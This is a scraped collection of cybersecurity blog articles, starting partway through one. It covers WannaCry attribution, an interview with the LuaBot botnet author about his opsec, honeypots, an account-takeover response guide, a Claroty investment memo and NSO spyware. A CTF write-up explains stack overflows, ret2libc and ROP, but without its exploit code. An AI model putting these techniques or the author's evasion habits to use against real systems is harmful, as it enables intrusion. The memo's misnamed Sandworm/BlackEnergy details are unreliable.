As the evidence pointing towards Lazarus group got stronger, it became clear that there’s no reason to attribute the ransomware code and campaign to Russia just because it is extremely politically useful for them (cui bono attribution). They could simply have provided some hints, persuasion or guidance to Lazarus group. That allows the Russians to reap the political benefits, and Lazarus group to take the fall like a patsy. Everyone wins! So I’m holding out this scenario as a possibility. This just feels right.
Since there is a high likelihood that WannaCry is a nation state group that has moved into ransomware, they aren’t likely to go away. A normal hacker group would be laying low to avoid capture, but these guys have no such concerns. As such, I predict that they’ll learn a great deal from what has been (for them) the WannaCry Debacle. They will add additional exploits from the NSA toolkit released by the Russians. They will raise the price on the ransom – $300 is way too low.
Seriously, a worm escaping out of the target environment is literally what happened with Stuxnet — developed by top US and Israeli offensive tool developers. Do you really think the imbeciles from Lazarus group could do any better?
Support more analysis like this.
Update: Symantec has released a blog post with more links to Lazarus group and a better timeline.
Written by
","['Cybersecurity', 'Lazarus Group', 'Wannacry', 'Operational Security', 'Cyber']"
Interview with the LuaBot malware author - x0rz - Medium,https://medium.com/@x0rz/interview-with-the-luabot-malware-author-731b0646fc8f?source=tag_archive---------5-----------------------,"The Linux/LuaBot malware has been very active in the last months and recently researchers thoroughly analyzed some samples (links at the bottom of the article). As the malware author seemed to be a nice guy (signing “happy reversing” in his binaries) I decided to contact him and ask a few questions, which he gladly and promptly answered for a few of them.
All replies are verbatim and not edited — so please don’t mind the typos.
I don’t like that attention, too much buzz about it, that’s bad, I tried to be quiet. Also reversers usually get it wrong and say there’s some modules for my bot, but those actually are other bots, some routers are infected with several bots at once. My bot never had any binary modules and always is one big elf file and sometimes only small <1kb size dropper.
Reversers usually get it wrong and say there’s some modules for my bot […], some routers are infected with several bots at once
Just some guy who likes programming. I’m not known security researcher/programmer or member of any hack group, so probably best answer for this would be — nobody
I’m trying not to be harmful for router user so my bot doesn’t steal any passwords
Started for fun, now for money too, so for both. I’m trying not to be harmful for router user so my bot doesn’t steal any passwords or spoof dns. Also I don’t run any booter services like vdos kids, working only in private personally with people and trying not to mess with gov/bank/othershit.
Also I don’t run any booter services like vdos kids, working only in private personally with people
VPN, Tor, only bitcoin for finances, never using real mail/nicknames for any blackhat activity. Switching nicknames, mails and other shit for different accounts.
Most are public or half public (no poc, had to reverseengineer myself) but I also try not to be a stupid scriptkid copypasting from net so trying searching them myself, have some 0days.
Bot is several years old, don’t know how much time it took if count only coding hours, I can not make any changes for weeks or work on it for week if need new feature. Probably half of a year for a 8h/5days/week working programmer if he knows what he should write, but it’s hard to count anyway because it was long evolution of this project from very simple tool just little more complex than those lizard bots to programming framework like it is now.
Flexibility. I can and complex code from cnc or match some bugs in runtime from it. Also writing lot of code in C sucks, as you may see from reversing articles my bot is lot more complex than simple ddos tools used by lizards and other, writing so much code in C would be time consuming, so only io core and other libs requiring speed are written in C, while other code with all logic is in lua. Why not other script lang? Small, plain C, easy to integrate with C code.
Don’t know. Maybe will make p2p c&c based on torrent’s DHT someday.
Also please mention that my bot never had and won’t have any binary modules as separate executables, all those are other bots and I don’t want people to think that I do what those bots do, because those may be heavily harmful to users or ddos banks/gov/big companies. My bot is always single more than 700kb binary and it’s philosophy is to be self contained and depend only on linux kernel itself, not to download many binaries or other modules, all additional code is in lua and loaded using c&c protocol, if something can’t be done using lua only then whole binary is updated for new features, no additional binary modules are required.
— End of the interview —
What is sure is that DDoS as a Service and other booters are a rising business. The emergence of the “Internet of Things” and low-cost connected devices will continue to be exploited for such activities, ensuring low maintenance botnets with high bandwidth and low visibility: embedded devices aren’t monitored and antivirus solutions are not usually deployed on such systems. Plus, they are riddled with vulnerabilities making them an easy target for blackhats.
This is certainly something we ought to see more often in the near future.
Sources:
Written by
","['Ddos', 'Cybersecurity', 'Malware', 'Cybercrime', 'IoT']"
Introducing Netflix Stethoscope - Netflix TechBlog - Medium,https://medium.com/netflix-techblog/introducing-netflix-stethoscope-5f3c392368e3?source=tag_archive---------3-----------------------,"Netflix is pleased to announce the open source release of Stethoscope, our first project following a User Focused Security approach.
The notion of “User Focused Security” acknowledges that attacks against corporate users (e.g., phishing, malware) are the primary mechanism leading to security incidents and data breaches, and it’s one of the core principles driving our approach to corporate information security. It’s also reflective of our philosophy that tools are only effective when they consider the true context of people’s work.
Stethoscope is a web application that collects information for a given user’s devices and gives them clear and specific recommendations for securing their systems.
If we provide employees with focused, actionable information and low-friction tools, we believe they can get their devices into a more secure state without heavy-handed policy enforcement.
We believe that Netflix employees fundamentally want to do the right thing, and, as a company, we give people the freedom to do their work as they see fit. As we say in the Netflix Culture Deck, responsible people thrive on freedom, and are worthy of freedom. This isn’t just a nice thing to say–we believe people are most productive and effective when they they aren’t hemmed in by excessive rules and process.
That freedom must be respected by the systems, tools, and procedures we design, as well.
By providing personalized, actionable information–and not relying on automatic enforcement–Stethoscope respects people’s time, attention, and autonomy, while improving our company’s security outcomes.
If you have similar values in your organization, we encourage you to give Stethoscope a try.
It’s important to us that people understand what simple steps they can take to improve the security state of their devices, because personal devices–which we don’t control–may very well be the first target of attack for phishing, malware, and other exploits. If they fall for a phishing attack on their personal laptop, that may be the first step in an attack on our systems here at Netflix.
We also want people to be comfortable making these changes themselves, on their own time, without having to go to the help desk.
To make this self service, and so people can understand the reasoning behind our suggestions, we show additional information about each suggestion, as well as a link to detailed instructions.
We currently track the following device configurations, which we call “practices”:
Each practice is given a rating that determines how important it is. The more important practices will sort to the top, with critical practices highlighted in red and collected in a top banner.
Stethoscope is powered by a Python backend and a React front end. The web application doesn’t have its own data store, but directly queries various data sources for device information, then merges that data for display.
The various data sources are implemented as plugins, so it should be relatively straightforward to add new inputs. We currently support LANDESK (for Windows), JAMF (for Macs), and Google MDM (for mobile devices).
In addition to device status, Stethoscope provides an interface for viewing and responding to notifications.
For instance, if you have a system that tracks suspicious application accesses, you could choose to present a notification like this:
We recommend that you only use these alerts when there is an action for somebody to take–alerts without corresponding actions are often confusing and counterproductive.
The Stethoscope user interface is responsive, so it’s easy to use on mobile devices. This is especially important for notifications, which should be easy for people to address even if they aren’t at their desk.
We’re excited to work with other organizations to extend the data sources that can feed into Stethoscope. Osquery is next on our list, and there are many more possible integrations.
Stethoscope is available now on GitHub. If you’d like to get a feel for it, you can run the front end with sample data with a single command. We also have a Docker Compose configuration for running the full application.
We hope that other organizations find Stethoscope to be a useful tool, and we welcome contributions, especially new plugins for device data
Our team, Information Security, is also hiring a Senior UI Engineer at our Los Gatos office. If you’d like to help us work on Stethoscope and related tools, please apply!
We’d like to thank ShmooCon for giving us the chance to present this work earlier this year. The slides and video are now both publicly available:
— by Jesse Kriss and Andrew White
Originally published at techblog.netflix.com on February 21, 2017.
Written by
","['Security', 'Cybersecurity', 'Netflixoss', 'Open Source', 'Netflixsecurity']"
Introduction to HoneyPy & HoneyDB - Signal Sciences Labs - Medium,https://medium.com/signal-sciences-labs/introduction-to-honeypy-honeydb-9dba4ee00a07?source=tag_archive---------9-----------------------,"Last week, I discussed HoneyPy and HoneyDB at Blackhat and Defcon. This week I wanted to dive a bit deeper into the projects.
If you’re not familiar with the concept of honeypots don’t worry, I’ll provide a brief explanation in this section. It makes sense to understand some basic honeypot concepts before reading about HoneyPy & HoneyDB. If you are familiar with honeypots, then feel free to skip to the next section.
At the highest conceptual level a honeypot is simply a computer that is configured to look and behave like any other computer you might find on any given network. A honeypot can be configured to offer various network services like HTTP, SSH, file sharing, etc. However, the honeypot serves no legitimate business purpose, so in theory no one should really ever attempt to establish a network connection with it. But if it ever does receive a connection, it will log all activity and possibly send alerts to the honeypot operators. Since connection activity should be rare, the logs and alerts are essentially high value signals to both security and operation teams. These are high value to security teams since its possible this could be an indicator of compromise. It is also high value to operations teams as it could mean another system on the network is misconfigured and is generating noise on the network.
Now that you have the concept down, there are a few honeypot types and tiers of interaction you should know about. First the types:
Next are the tiers of interaction, which is about how much interaction does the honeypot enable or allow.
Those are the basic concepts, nothing too complicated. If you are interested in learning more about honeypots here are a few good places to start.
Now on to HoneyPy and HoneyDB…
HoneyPy is a low to medium interaction honeypot, written in Python. It is intended to be a honeypot that is easy to configure, deploy, and extend. You can find the project on Github here https://github.com/foospidy/HoneyPy.
HoneyPy was built to be extensible so you can easily add new service emulations (plugins) for both TCP or UDP based protocols. However, it does come with a small set of basic plugins, listed here, that you can run or use as a starting point to write your own. In addition, configuring what plugins you want to enable is as simple as editing the services.cfg file.
Another great feature is its event log handler integrations with other tools like Twitter, HoneyDB, Slack, Logstash, and Elasticsearch. These event log handlers are intended to make consuming log events more convenient. Rather than writing scripts to parse a log file and generate alerts, the HoneyPy log handlers do that for you. It is relatively trivial to create new new event log handlers so the list of tools will continue to grow.
HoneyPy is easy to deploy, and I’ll cover this and more in a subsequent blog post. However, if you are a fan of Docker containers and would like to quickly spin up an instances, I provide Docker build scripts here https://github.com/foospidy/HoneyPy-Docker. Or you can pull an image from https://hub.docker.com/r/foospidy/honeypy/. I invite you to give it a try.
HoneyDB is a database and web site created to capture and display event data from HoneyPy sensors that are running on the Internet. I’ve been running HoneyPy sensors and collecting data for a few years now. You can find HoneyDB here https://riskdiscovery.com/honeydb/. There are several features on HoneyDB I could dive into, but I’ll save that for a follow up post.
At a high level you’ll notice various charts showing top traffic statistics. You can click on the pie charts to drill down into specific activity generated from an IP address. One main feature to highlight is the API. The API enables users to leverage the data HoneyDB is collecting as a threat information feed. See more details here https://riskdiscovery.com/honeydb/#threats. In addition, if you want to run your own HoneyPy sensor it can be configured to contribute its event data to HoneyDB! The more sensors contributing the better HoneyDB becomes as a threat information resource.
For anyone that’s every been curious about running their own honeypot, you should go for it as you will definitely learn something new. HoneyPy and HoneyDB are great tools for getting started so please give them a try! Also, any feedback or questions are welcome. Keep an eye out for the follow-up posts, thanks for reading!
At Signal Sciences we are building a modern Application Security defense product that works for microservices, APIs, Web Applications and anything else that speaks HTTP/HTTPS. Signal Sciences’ NextGen Web App Firewall works seamlessly across cloud, physical, and containerized infrastructure, providing security without breaking production traffic.
Written by
","['Application Security', 'DevOps', 'Modern Security', 'Virtual Honeypots', 'Awesome Honeypots ', 'Infosec', 'Information Security', 'Honeypot', 'Cybersecurity', 'Open Source']"
Intro to Pwn - Aneesh Dogra’s Blog,https://anee.me/intro-to-pwn-65876c0cb558?source=tag_archive---------3-----------------------,"Easy pwn questions in TamuCTF 2018 and how to solve em. A recent CTF hosted by the students of Texas A&M University took place from 2/16 at 6 pm CST to 2/25 6pm CST. It was a fun CTF aimed at beginners and I thought I will make a guide on the pwn questions as they are noob-friendly to start with. So without further BS lets get to hacking.
25
nc pwn.ctf.tamu.edu 4321
pwn1
The first question is a short binary, with a very well known vulnerability. Lets run it once.
So the binary asks for a secret word. Lets dig in deeper and check whats happened.
Now that we have breakpoints setup, lets run the debugger and check what happens in main.
We notice that notorious gets called — which loads the RVA (Relative Virtual Address) [ebp-0x23] onto stack before calling. This is the first argument to gets, which is the address to which the gets call will write to. Then it checks if ebp-0xc is equal to 0xf007ba11.
You guessed it right! All we need to do for the first challenge is overwrite ebp-0xc to the required value to get the flag.
To figure out the offset between the 2 RVAs we simply subtract them and get 23. Anything we enter after 23 chars goes into ebp-0xc.
Given that, here’s our exploit:
Lets move on.
50
nc pwn.ctf.tamu.edu 4322
pwn2
pwn2 was a similar ELF 32 bit binary. Short and sweet.
main:
echo:
A similar exercise. We call echo, which has a similar gets vuln. But there is no comparison jumping us to print flag as last time. In this we need to actually overwrite the return pointer on stack and point it to the getflag function.
How do we get the getflag function?
Readelf gives us the address pretty quick: 0x0804854b. Now we need to figure out a way to overwrite the return pointer to this value and we are done.
We push ebp-0xef to gets. The stack frame is at [ebp] and the return pointer is at [ebp+0x4]. Same way to calculate offset we get:
So 243 bytes of BS + address to our print_flag is our exploit. Here we go:
Moving on…
75
nc pwn.ctf.tamu.edu 4323
pwn3
Pwn3 is when things start getting interesting. Its also a pretty straightforward binary.
In this binary there is the same gets vuln, but we don’t have a print flag function in the binary so we need to get a shell. Lets dig deeper into the echo call, and what it returns.
The random number printed in the beginning of the function is actually the location of our buffer that ‘gets’ writes to. And as this binary has an executable stack, we can simply push our shellcode and point the return pointer to the buffer. Lets use the pwntools at our disposal to easily push our inputs to the binary and generate a shellcode on the fly.
That’s our exploit ^
Lets take a look at the next pwn.
125
nc pwn.ctf.tamu.edu 4324
pwn4
pwn4 is essentially the same story with a bit of extra protection. We no longer have an executable stack, so we need to use the libc at our disposal.
The main function calls reduced_shell:
which has a gets overflow.
Now at this point we can control the return pointer, just like we did earlier. But we dont have any function to jump to :(. Here is where we use a very simple application of Return Oriented Programming (ROP). One of the simplest techniques of ROP is: return to libc. You guys can probably read more about it on the web, as these techniques are quite old and readily used.
TL;DR: The GOT table entries in a binary contain a pointer to the addresses of libc. The GOT table is at a constant location every run, so we can use these entries to jump to libc and execute the “system” function.
Here’s your exploit:
Getting to the last one…
200
nc pwn.ctf.tamu.edu 4325
Note: The output is not buffered properly but exploits should still work
pwn5
So pwn5 is a text based game.
Reading the assembly in GDB tells us that there is a vuln when the user tries to change his/her major.
Same stuff. But there is a catch, we dont have ‘system’ in the GOT table of the binary. So we can’t just ret to libc like last time. We need a more complex rop chain. As we don’t have any idea where the libc is loaded or what version is loaded. The only way to make the rop chain is by using existing code in the binary. Ropper can help us with that.
Now that we have the ropchain we change the data addresses and integrate it into our exploit. Here’s the final exploit for this CTF:
That’s all folks. Hope you learned a thing or 2. :)
Written by
","['Archive', 'Reverse Engineering', 'Pwnage', 'Symbolic Execution', 'Security Engineering', 'Misc', 'Hacking', 'Pwn', 'Pentesting', 'Cybersecurity', 'Programming']"
Investigating Account Takeover - Starting Up Security - Medium,https://medium.com/starting-up-security/investigating-account-takeover-21514954aa8f?source=tag_archive---------4-----------------------,"Users of your product have been attacked and have lost control of their accounts. We’ll discuss how a security team would approach the situation. Each attacker method has its own forensic properties to observe. This will guide your response.
If you’re looking to prevent account takeover altogether, read this instead:
Instead, we’ll focus on response to hacked users in this article.
If you respond without becoming familiar with these different types of attacks, you may botch the cleanup and see your users suffer repeated account takeovers. If you’re experiencing a breach at scale, you will only want to clean this up once, and need to identify it correctly the first time.
Here are a few things that will improve your ability to troubleshoot account takeover:
…And make sure they’re usable enough to investigate.
In order to investigate any type of account breach, you’ll need to have access to a decorated authentication log for your users. You’ll need to observe the actions they’ve taken on the site (login, logout, adding payment instruments, adding / removing things), IP address associated with the action, and Browser or User Agent, which is hopefully a unique string associated with their client. Most security teams only log the actual User Agent string, but it’s better to have something like a randomly generated, unique string in a cookie to compare against many other similar clients for these many breach scenarios.
You will need logging around password resets and additional registration email changes, including the previous and new email you have for the users.
You’ll need the ability to pivot between IP addresses and known users accessing your product. This is an extremely common use case:
You don’t need to build a big sexy UI for this, but the ability to run circular lookups in a console or web UI will make this experience much nicer. Keep in mind there are infinite other troubleshooting scenarios you’ll be able to use this workflow for, it won’t be used solely for incident response.
These are the types of attacks that would cause a user’s account to exhibit malicious behavior. We’ll start with malware.
If a user is continuously doing bad things despite a password reset… then there is likely some form of persistent malware harming them. In almost all malware cases, the attacks will appear to be coming from the victimized user’s personal machine and IP address, as opposed to a remote foreign IP address they’ve never used (or could not possibly use due to their physical location).
You very likely don’t have access to the user’s machine itself. Near the bottom is appendix of help articles companies use to instruct the user through these steps that you can pull from for your own FAQ
People have the habit of installing tons of browser extensions. These extensions have limited, but similar capabilities of executable code running on a users machine.
These can be found by digging into a victims loaded extensions. Chrome Extensions especially can’t hide from an investigation very well unless they’ve managed to pivot from and somehow install other software outside of the browser.
Also, you can explore the permissions of the extension which will give you a roadmap for other forensic response, like modified bookmarks or proxies. You have to eliminate any tampering that occurred.
There is a trend that makes these attacks more common, and that’s previously innocent extensions sold to bad guys to be repurposed as attack tools. An extension a victim may have been holding for a while can suddenly become a blackhat extension.
After being sold to a malware author, new code is pushed down to cause your exploit your users and misbehave on your product.
Mitigation: Try to discover which extension is being used with a single victimized user. Investigate permissions of the extension and what may have changed within the browser. Advise all impacted users to delete extension and clear local storage, exit browser. Destroy all known server side user sessions. Reset the password.
A clickjacked user can make it appear as if their computer taken over by a bad guy, because they will have taken a small amount of actions that they simply won’t remember from their own machine. Except, they’re not infected with malware, despite all the signs of a local compromise.
Clickjacking (also known as a User Interface Redress) is a method where an adversary manipulates a user into clicking in a specific way over objects floating on top of your own application. When the clicks take place, they are actually interacting with your own site.
For example: The user may think they’re playing a silly game like “put the ball in the hoop for a free gift card”. However, underneath this game, they are unknowingly clicking on your product’s user interface and harming themselves from their own machine, as if they’ve gone temporarily insane.
Reviewing the user’s activity will quickly show that they don’t have any foreign logins from strange places, and maintained the same user agent. This will make it appear as if they were fully aware of their actions, when in fact they weren’t. Upon an interview, they may remember a spam email or otherwise remember playing some kind of game, but rarely. They may also have the clickjacking attack in their browser history around the timeframe of the malicious action.
Mitigation: This is sometimes simple, and only requires some browser headers to prevent your product from being iframed by another domain. If you require your product to be iframed (for instance, a digg button), it will get more complicated.
Write up a help document and send it to users that were impacted. If clickjacking caused the user to install malware or add another user to the account, that is a separate issue.
Similar to Clickjacking, Self-XSS is another example where a user exhibits temporary insanity without actually losing their credentials or seeing a malicious login. The attack is performed by convincing a user to run javascript within their browser by a copy paste into the URI bar or the debugging console. The result is a browser fully under the control of the attacker, very similar to the result of a traditional XSS attack.
Facebook and Google has been impacted so often by these attacks that they throw a warning in the Chrome console when users would be one step away from hurting themselves:
Mitigation: The primary defense against Self-XSS is awareness and education (plus a warning like the above helps as well). Browsers have also made adjustments to add warnings when a user is about to shoot themselves in the foot, but are incomplete.
To clean up a self-XSS’d user, advise the user to clear out all local storage and reset the browser to avoid any obscure methods of persistence that attackers look to maintain. Destroy all known user sessions. It’s not necessary to reset their password, but if attacks appear to be phishing the user as well, it may be necessary.
Malware will sometimes manipulate the browser itself and interfere with the DOM a user is interacting with. Meaning, a user will be looking at your website and firmly believe you’re showing them a GUI that does not actually exist, except in their own browser.
The family of malware called Zeus has long been a toolkit for malware authors to perform these sorts of attacks, mostly against banking sites but also against social media.
Mitigation: This is just traditional malware removal. You can advise the user to use antivirus (lazy), give them per-malware instructions (high effort), or tell them wipe their machine (expensive and rage inducing).
Destroy all known user sessions. Reset the user’s password.
Previously we covered a persistent threat on a users machine that causes repeat compromises. In these cases, a users password is stolen and remotely used away from their computer, usually from suspicious IP address.
Many people have a generic definition for phishing, but mine is very specific. Phishing is an attack that leverages a spoofed landing page of your product to convince a victim so share their credentials in the wrong place.
Phishing has lots of characteristics that will reveal itself and is among the most well known types of account breaches you can investigate.
A phishing attack will grab a users password and try to log in remotely from a totally unknown IP address. So, you’ll see records of that. The attacker might spoof the User Agent of the victim if they were able to phish them over a browser (the phisher can see it), but it will be impossible for them to spoof other unique cookies unless they found some way to violate the same origin of the browser.
While the victim is interacting with a phishing site, you’ll likely see Referral data coming back to your domain. This is hard to avoid unless the phishing site is well made. Finding this evidence will not only be a dead giveaway that your hacked user is a result of a phishing attack, it will give you a website to report for abuse.
A huge benefit to interactive phishing attacks is the ability to steal a second factor. This will explain any two factor bypasses that you see. However, it’s only temporary, as the attacker will only have access to one session.
Mitigation: Destroy all known user sessions. Reset the users password. Inform them that if they are using the password anywhere else (especially with the email address they registered with) they are at risk and should reset those too. They should sign up again with a unique password. If two-factor was stolen, they don’t need to reseed their app or anything like that.
Companies are breached all the time in ways that result in large amounts of passwords becoming available on the internet. Attackers with credentials from a database breach behave very differently than attackers with credentials from a phishing site, mainly because they don’t have a victim engaged with a website of their own.
Namely, they don’t know the victim’s user agent, and the attacker is unable to capture a second factor like a OTP. Also, the attacker will have credentials for possibly thousands of other users that are not on your platform, causing tons of false alarms as they race through login attempts. A targeted phishing site, however, will have very rate of successful logins, comparably, with their stolen credentials.
Mitigation: Destroy all known user sessions. Reset the users password. Inform them that if they are using the password anywhere else (especially with the email address they registered with) they are at risk and should reset those too. They should sign up again with a unique password.
Keyloggers are usually a form of malware that persists on a users’s computer, but can also come in hardware form. You’ll almost always find this in a software flavor, but hardware attacks are possible in situations where a victim was directly targeted by a physical adversary. This is rare, but here’s a picture anyway:
Keyloggers are unique because they attack a user while at keyboard on their own laptop, but usually ship the passwords they discover remotely to an adversary elsewhere. This is a very deceptive behavior while trying to troubleshoot because it looks so similar to other attacks that happen remotely, like a database breach or a phishing attack.
The key difference here is that the user will have their password stolen and used remotely repeatedly, despite password resets. In a database breach or traditional phishing attack, one password reset for the user is enough for mitigation, whereas a keylogger will repeatedly steal their new passwords.
Mitigation: Advise the user through malware cleanup. Destroy all known user sessions. Reset the users password and make sure they weren’t using the password anywhere else, especially with the email address they registered with.
Identifying a user who has lost control of their registration email address is pretty simple.
Upon step five, you may be thinking “keylogger?” if you didn’t notice the password reset or have a log of it taking place.
The repeat back and forth email resets are indicative that the maclious actor is able to access the password reset emails to the user, and is triggering them to regain access at will. They’re in the victims email.
Mitigation: This whole writeup needs to be followed (again) with the users email address in mind. Unfortunately, you probably don’t work at that email provider to do the troubleshooting, so this is extra hard as most of the evidence will be out of your line of sight.
Fortunately, most email providers have some sort of “recent activity” you can observe to help isolate the issue, along with your own password reset logs.
Additionally, make sure the user isn’t forwarding email elsewhere, which would give remote access to password reset emails without access to the password.
The most rare case to troubleshoot is also the hardest, and that’s when almost all of the above scenarios have none of the evidence to point to them. A user’s account is misbehaving, and no amount of troubleshooting can point to an issue with the user, their credentials, or their system. No malware, no phishing, no attack in the browser…. nothing.
In this case, it’s possible your underlying systems or employees have been breached and this is causing the misbehavior. There will be little to no evidence of this behavior unless you’re specifically logging administrative actions (not user actions), because your adversary is accessing administrative tools directly, or even an underlying data at rest on a server.
Here are some examples:
SendGrid employees were reportedly compromised via social engineering, which modified user accounts and allowed the “bad guys” to attack Bitcoin companies. Their administrative tools would bypass anything a typical user could do, which would be tough to troubleshoot.
A Twitter employee used the password ‘happiness’ for administrative access to accounts, and this was discovered and used by a hacker to tweet as Barack Obama. Again, a review of Barack Obama’s account likely wouldn’t have had any evidence associated with it, as an employee’s access was leveraged.
Google was breached in 2010 and very publicly blamed China for the incident. Their systems were used to gain access to the Gmail accounts of Tibetan activists. The activists themselves probably saw no activity in their “Recent Activity” and a password reset would have been irrelevant .
Ai Wei Wei, an activist reportedly targeted in this attack, noted how password resets weren’t helpful for him given the user was compromised in other ways.
The irony of this situation is the tools used to troubleshoot account takeover could end up being used by bad guys. This is a whole different discussion and probably a smart thing to look over Starting Up Security.
Mitigation: This sort of scenario can go as far as a total corporate compromise, in which I would recommend reading Security Breach 101.
There are several takeaways that you should see in this article:
I’m a security guy, former Facebook, Coinbase, and currently an advisor and consultant for a handful of startups. Incident Response and security team building is generally my thing, but I’m mostly all over the place.
Written by
","['Security', 'Cybersecurity', 'Startup']"
Investment Recommendation: Claroty - Bessemer Venture Partners - Medium,https://medium.com/think-with-bvp/investment-recommendation-claroty-series-a-4bef100a7348?source=tag_archive---------8-----------------------,"Today, Claroty came out of stealth, announcing a $32 Million venture financing led by Bessemer. That’s a lot for an early stage startup, but this is an important company for our nation and our planet. To explain why, I thought I’d share this excerpt from our internal investment memo.
EXCERPT from APRIL 2016:
The Need for Industrial Security
The physical infrastructure of modern civilization runs on machinery: traffic lights, railroad switches, nuclear reactors, water treatment, electricity distribution, dams, ship engines, draw bridges, oil rigs, hospitals, gas pipelines, and factories depend upon mechanical elements such as pressure valves, turbines, motors, and pumps. These actuators (like the ones in the original Bessemer steel smelting process) were once manually configured, but today these machines are controlled by software running on directly-attached, single-purpose computers known as Programmable Logic Controllers (PLC). PLCs, in turn, are connected in aggregate to computers running Human Management Interfaces (HMI) through closed, vendor-proprietary Supervisory Control & Data Acquisition (SCADA) protocols like DNP3 and Profibus. Industrial manufacturers provide the machines, the PLCs, and the HMIs, and so Operations Technology (OT) teams typically need to use a mix of controllers and interfaces. This is collectively known as an ICS.
During the PC revolution, many of these ICS components migrated to cheap, standard PCs, and their SCADA connections migrated to LAN switches and routers that leveraged the connectivity benefits of those PCs’ standard Ethernet ports. The security implications were relatively minor until the Internet came along; but now, if any computer in the building is connected to the Internet, all the machines are potentially exposed. ICS security had once depended upon an air-gap between IT and OT networks, and where absolutely necessary devices like one-way diodes were used to send data out of the OT network to the outside world. However, trends like remote management, cloud, IoT, and the adoption of open standards are eroding the network segmentation and creating new attack vectors.
The threat of ICS attacks differs greatly from threats plaguing other computer networks. First, there is little valuable data to steal from a PLC (with the theoretical exception of pharmaceuticals), and yet the consequences of an attack are potentially catastrophic; the worst doomsday scenarios of cyber warfare arise from compromised machinery such as gas relays, dams, reactors, and water treatment facilities that can kill millions of people when they malfunction. To get a taste of the kind of damage we’re talking about, watch this video from 2007, where members of the Idaho National Laboratory hacked some of its own machinery.
Second, the fear of unexpected downtime also makes OT teams less willing to experiment with new hardware and software updates. These factors create an environment of older computers running older software that is never patched despite the accumulation of known vulnerabilities.
Finally, OT teams will not run encryption or conventional cybersecurity software on their computers, lest the security processes interfere with the precise and fragile timing of their network; they would rather be infected than incur downtime. And evidence of infections is mounting:
• The Stuxnet worm, allegedly developed jointly by NSA and the Israeli Army’s intelligence arm (Unit 8200), crippled the Iranian nuclear program by destroying their centrifuges;
• Iran crippled the operations of the most valuable company on Earth, Saudi Aramco;
• According to BVP-funded iSIGHT Partners, the Russia-based Sandstone Team developed the Blackworm malware that shut down power for 700K Ukrainians;
• For two years, an Iranian group controlled malware inside a dam in Rye, New York (near BVP’s Larchmont office).
The malware behind these attacks likely lay dormant for some time, and there is no comprehensive way to know how much more already lurks in critical ICS just waiting to be activated. According to the ICS-CERT, we discover more and more infections every year in US infrastructure. So, at a time when nation-states, terrorists, and criminal organizations are scrambling for an advantage in cyberspace, society’s most critical infrastructure remains exposed and undefended.
Claroty’s Origin
Although our investment in cyber foundry Team8 is gaining market value, we originally invested for more strategic reasons. Following our roadmap principle of “following the attackers,” we have long known that ICS would develop into a significant target, and hoped Team8 would provide us the best opportunity to invest in this market. They did just this with Claroty (fka Team 82), which is the second spin-out. Claroty is one of two dozen companies addressing cyber attacks on ICS. While Claroty is a newer entrant in this relatively nascent space, we believe deep the experience of its team makes it the likely winner.
Recall that retired Israeli General Nadav Zafrir had founded Team8 to focus the world’s best nation-state cyber warriors on the biggest challenges of cyber security. Zafrir recently commanded Unit 8200, considered Israel’s equivalent to the US National Security Agency (NSA). But unlike the NSA, which employs career-minded employees, Unit 8200 draws and trains the smartest draftees from the Israeli population, who, like everyone else, typically resign their military commission after three years. Naturally, several of them founded cybersecurity companies like Check Point, Palo Alto Networks, and NICE. So now Zafrir, along with the Unit’s former Head of Cyber (Israel Grimberg) former Chief Technology Officer (Assaf Mischari), and distinguished officer Liran Grinberg, recruit and commercially train the top 1% of those graduates, re-purposing them in cybersecurity startups.
A principal skill set attributed to Unit 8200 is blind protocol analysis. If, for example, you wished to hack a Siemens centrifuge, you’d need to deconstruct the packets sent back and forth between the HMI and the PLC, or between the PLC and the actuator. Most protocols were cobbled together decades ago and were rarely well documented, and in some cases the vendors themselves treat them as holy writ. Unit 8200 is reputedly the best in the world at quickly and accurately understanding and parsing them down to the individual bit level. Team8 recruited the best, most experienced ICS thought leaders in Unit 8200, led by their team leader Benny Porat (CS PhD), to staff Claroty.
When Team8 starts a new company, it marries a technical team with an entrepreneurial founder. In the case of Claroty, Team8 recruited Amir Zilberstein, who founded the successful Waterfall Security and Gita Technologies. Waterfall develops ICS security products (unrelated to Claroty’s product); Gita’s technology remains undisclosed. Team8 also recruited Galina Antova, the former head of Siemens’ Industrial Security Services division, to run business development. Antova is a super impressive executive — highly connected, brilliant, and fast-moving. [See Appendix: Due Diligence for summaries of the team reference calls.] Next step is to recruit a CMO — we hope to get Patrick McBride, who was a star at iSight.
Beyond Security
With meaningful Operations Technology (OT) experience on the team, Claroty is taking a different approach to the market than its competitors who generally come from cybersecurity backgrounds. Rather than lead with the cybersecurity benefits of their product, Claroty has developed an OT visibility platform that first and foremost surfaces operational issues. By deconstructing the proprietary vendor protocols, Claroty has delivered the first heterogeneous HMI with analytics that span an ICS network. Seeing as how most OT teams today care more about downtime than infection, we believe this approach will enjoy a far better reception in the near-term.
Written by
","['Cybersecurity', 'Venture Capital', 'Critical Infrastructure', 'Series A', 'Thinking']"
Israel’s Silent Cyberpower Is Reshaping the Middle East,https://onezero.medium.com/israels-silent-cyberpower-is-reshaping-the-middle-east-af1458d16a15?source=tag_archive---------7-----------------------,"“New secrets about torture of Emiratis in state prisons.” So read a text message sent in 2016 to the iPhone of Ahmed Mansoor, a prominent human rights activist from the United Arab Emirates.
It was followed by a link. Mansoor did not tap it. Conscious of previous attempts to hack his communications, he forwarded the message to a security researcher at the digital rights watchdog Citizen Lab. What happened next would be a crucial step in a story that is quietly reshaping the Middle East.
According to an investigation by Citizen Lab, the link led to spyware created by the Israeli technology company NSO Group. Citizen Lab wrote that the existence of the spyware highlighted the “continuing lack of effective human rights policies and due diligence” at such companies based in democratic countries. Under Israel’s export laws, NSO Group would presumably have had to obtain a license to sell its products to the UAE. “The human rights abuses perpetrated by the UAE,” Citizen Lab wrote, “must not have outweighed authorities’ other motivations to approve the export.”
NSO Group and its Pegasus spyware have since been connected to the tracking of politicians and journalists in the UAE, and last month the security adviser Gavin Becker claimed it had been used to spy on Amazon CEO Jeff Bezos. Pegasus also allegedly played a part in the murder of the Saudi Arabian journalist Jamal Khashoggi. NSO Group, which its founders acquired in February from former majority owners, the U.S. private equity firm Francisco Partners, has denied that its software was used to spy on Khashoggi or Bezos.
In a statement to OneZero, an NSO Group spokesperson said the company adheres to “all applicable laws and regulations” and that it had established a business ethics committee to ensure its technologies are used responsibly. “We do not tolerate misuse of our products and we regularly vet and review our contracts to ensure they are not being used for anything other than the prevention or investigation of terrorism and crime.”
